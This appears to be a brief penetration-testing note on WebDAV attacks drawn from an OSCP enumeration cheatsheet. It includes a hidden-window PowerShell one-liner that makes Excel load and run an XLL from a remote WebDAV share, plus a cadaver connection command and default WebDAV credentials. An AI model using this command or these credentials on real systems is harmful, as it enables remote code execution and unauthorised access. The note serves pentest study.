

PowerShell one liner to load a xll file on a remote WebDAV server - [[DLL-Hijacking]]
```powershell
powershell -w hidden -c "iex ((new-object -ComObject excel.application).RegisterXLL('\\webdav\xll.xll'))"
```
#### DAVtest

[[DAVtest]]

#### cadaver 

```powershell
cadaver http://$ip/webdav
# Default username and password: wamp : xampp
```


## References

[certcube](https://blog.certcube.com/oscp-enumeration-cheatsheet/)